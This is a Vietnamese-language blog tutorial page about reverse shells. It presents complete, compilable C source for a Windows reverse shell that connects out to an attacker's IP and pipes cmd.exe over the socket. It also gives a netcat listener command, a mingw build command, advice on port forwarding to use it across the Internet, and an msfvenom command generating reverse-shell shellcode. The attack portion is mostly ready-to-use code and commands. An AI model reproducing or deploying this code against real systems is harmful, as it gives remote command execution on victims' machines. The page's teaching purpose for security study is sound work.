<!DOCTYPE html>
<html>
  <head>
    <!-- Google tag (gtag.js) -->
    <script
      async
      src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"
    ></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());

      gtag("config", "G-3NTSMWGK5D");
    </script>
    <meta charset="UTF-8" />
    <title>Reverse Shell</title>
    <link
      rel="icon"
      type="image/png"
      href="https://asayami.github.io/favicon.png"
    />
    <link rel="stylesheet" href="malware_source/malware_css.css" />
    <link rel="stylesheet" href="https://asayami.github.io/theme/theme.css" />
    <script src="malware_source/malware_js.js"></script>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>
    <meta
      name="description"
      content="Những bài viết, kinh nghiệm của mình về malware"
    />
    <meta name="keywords" content="Hacking, hack, malware, virus, assembly" />
    <meta name="author" content="Asayami Kurashin" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <!-- Navigation Bar -->
    <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
      <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
        <script>
          window.onscroll = NavScroll;
        </script>
        <a class="navbar-branch" href="https://asayami.github.io/">
          <img
            src="https://asayami.github.io/transparent-favicon.png"
            style="width: 50px"
          />
        </a>
        <button
          class="navbar-toggler ml-auto custom-toggler"
          type="button"
          data-toggle="collapse"
          data-target="#navbarResponsive"
          aria-controls="navbarSupportedContent-7"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item active navitem">
              <a href="https://asayami.github.io/"
                >Home
                <span class="sr-only">(current)</span>
              </a>
            </li>
            <div class="dropdown-divider"></div>
            <li class="nav-item navitem">
              <a href="https://asayami.github.io/hacking.html">Security</a>
            </li>
            <div class="dropdown-divider"></div>
            <li class="nav-item navitem">
              <a href="https://asayami.github.io#aboutanchor">About</a>
            </li>
            <div class="dropdown-divider"></div>
            <li class="nav-item navitem">
              <a href="https://asayami.github.io#contactanchor">Contact</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <div class="mainPicture"></div>
    <div class="paragraph">
      <h3>Reverse shell là gì ?</h3>
      <p>
        Reverse shell là 1 loại RCE mà khi đó nạn nhân là phía mở cổng tới máy
        hacker. Đây là loại tấn công có thể bypass firewall và khó để ngăn chặn.
        Tuy nhiên, loại tấn công này sẽ khiến hacker bị lộ thông tin server.
      </p>
      <h3>Listener</h3>
      <p>
        Cách đơn giản nhất để tạo listener đó là sử dụng netcat của linux/unix.
        Ví dụ, trên linux, chạy lệnh sau để mở port 4444 với -l là listen, -v là
        verbose, -p là port:
      </p>
      <p><a style="color: #009933"> nc -lvp 4444 </a></p>
      <h3>Tạo reverse shell trong C</h3>
      <p>
        Code C này sẽ mở reverse shell trên Windows ở máy nạn nhân, đối với
        Linux mình sẽ để code ở dưới.
      </p>
      <!-- HTML generated using hilite.me -->
      <div
        style="
          background: #ffffff;
          overflow: auto;
          width: auto;
          border: solid gray;
          border-width: 0.1em 0.1em 0.1em 0.8em;
          padding: 0.2em 0.6em;
        "
      >
        <pre
          style="margin: 0; line-height: 125%"
        ><span style="color: #888888">/*</span>
<span style="color: #888888">shell.cpp</span>
<span style="color: #888888">author: @cocomelonc</span>
<span style="color: #888888">windows reverse shell without any encryption/encoding</span>
<span style="color: #888888">*/</span>
<span style="color: #557799">#include &lt;winsock2.h&gt;</span>
<span style="color: #557799">#include &lt;stdio.h&gt;</span>
<span style="color: #557799">#pragma comment(lib, &quot;w2_32&quot;)</span>

WSADATA wsaData;
SOCKET wSock;
<span style="color: #008800; font-weight: bold">struct</span> sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

<span style="color: #333399; font-weight: bold">int</span> <span style="color: #0066BB; font-weight: bold">main</span>(<span style="color: #333399; font-weight: bold">int</span> argc, <span style="color: #333399; font-weight: bold">char</span><span style="color: #333333">*</span> argv[])
{
  <span style="color: #888888">// listener ip, port on attacker&#39;s machine</span>
  <span style="color: #333399; font-weight: bold">char</span> <span style="color: #333333">*</span>ip <span style="color: #333333">=</span> <span style="background-color: #fff0f0">&quot;127.0.0.1&quot;</span>;
  <span style="color: #333399; font-weight: bold">short</span> port <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">4444</span>;

  <span style="color: #888888">// init socket lib</span>
  WSAStartup(MAKEWORD(<span style="color: #0000DD; font-weight: bold">2</span>, <span style="color: #0000DD; font-weight: bold">2</span>), <span style="color: #333333">&amp;</span>wsaData);

  <span style="color: #888888">// create socket</span>
  wSock <span style="color: #333333">=</span> WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span style="color: #007020">NULL</span>, (<span style="color: #333399; font-weight: bold">unsigned</span> <span style="color: #333399; font-weight: bold">int</span>)<span style="color: #007020">NULL</span>, (<span style="color: #333399; font-weight: bold">unsigned</span> <span style="color: #333399; font-weight: bold">int</span>)<span style="color: #007020">NULL</span>);

  hax.sin_family <span style="color: #333333">=</span> AF_INET;
  hax.sin_port <span style="color: #333333">=</span> htons(port);
  hax.sin_addr.s_addr <span style="color: #333333">=</span> inet_addr(ip);

  <span style="color: #888888">// connect to remote host</span>
  WSAConnect(wSock, (SOCKADDR<span style="color: #333333">*</span>)<span style="color: #333333">&amp;</span>hax, <span style="color: #008800; font-weight: bold">sizeof</span>(hax), <span style="color: #007020">NULL</span>, <span style="color: #007020">NULL</span>, <span style="color: #007020">NULL</span>, <span style="color: #007020">NULL</span>);

  memset(<span style="color: #333333">&amp;</span>sui, <span style="color: #0000DD; font-weight: bold">0</span>, <span style="color: #008800; font-weight: bold">sizeof</span>(sui));
  sui.cb <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">sizeof</span>(sui);
  sui.dwFlags <span style="color: #333333">=</span> STARTF_USESTDHANDLES;
  sui.hStdInput <span style="color: #333333">=</span> sui.hStdOutput <span style="color: #333333">=</span> sui.hStdError <span style="color: #333333">=</span> (HANDLE) wSock;

  <span style="color: #888888">// start cmd.exe with redirected streams</span>
  CreateProcess(<span style="color: #007020">NULL</span>, <span style="background-color: #fff0f0">&quot;cmd.exe&quot;</span>, <span style="color: #007020">NULL</span>, <span style="color: #007020">NULL</span>, TRUE, <span style="color: #0000DD; font-weight: bold">0</span>, <span style="color: #007020">NULL</span>, <span style="color: #007020">NULL</span>, <span style="color: #333333">&amp;</span>sui, <span style="color: #333333">&amp;</span>pi);
  exit(<span style="color: #0000DD; font-weight: bold">0</span>);
}
</pre>
      </div>

      <p>
        <br />WSAStartup khởi tạo những thứ cần thiết để sử dụng Winsock DLL.
      </p>
      <p>
        Sau đó, khai báo wSock, hax và dùng WSAConnect để kết nối đến remote
        host.
      </p>
      <p>
        Sử dụng memset và biến sui để tuỳ chỉnh thuộc tính Windows của vùng nhớ
        bằng cấu trúc STARTUPINFO (sui). Vùng nhớ sẽ được xử lí input, output,
        error qua wSock.
      </p>
      <p>
        Cuối cùng khởi chạy CMD ở vùng nhớ đó bằng CreateProcess với config sui
      </p>
      <p>Để compile, bạn đọc có thể dùng lệnh sau trên linux:</p>
      <p>
        <a style="color: #009933">
          i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -s
          -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions
          -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
        </a>
      </p>
      <p>
        Hoặc có thể compile bằng IDE như Dev C++ với compiler option: -lws2_32
        -lwsock32 (khi gọi compiler)
      </p>
      <img
        src="malware_source/rev_shell.png"
        style="width: 60%"
        class="img-fluid mx-auto d-block responsive_phone"
      />
      <p>
        <br />Bạn đọc có thể test trong mạng LAN. Nếu chỉ có 1 máy có thể sử
        dụng máy ảo như mình, với cài đặt mạng bridge để setup máy ảo có IP
        local riêng. Nếu VirtualBox bị lỗi không chọn được card mạng khi setup
        bridge, có thể reinstall VirtualBox để fix.
      </p>
      <p>
        Nếu muốn test giữa 2 máy trên Internet thì cần port forward máy attacker
        thông qua default gateway router.
      </p>
      <h3>Reverse Shell in Linux</h3>
      <p>
        Bạn đọc có thể tham khảo tại:
        <a
          href="https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html"
          >Here</a
        >
      </p>
      <h3>Shell Code</h3>
      <p>
        Trên Linux chúng ta có thể sử dụng msfvenom để gen shell code mong muốn
        như lệnh dưới:
      </p>
      <p>
        <a style="color: #009933">
          msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.6 LPORT=4444 -f
          rb
        </a>
      </p>
    </div>
  </body>
</html>
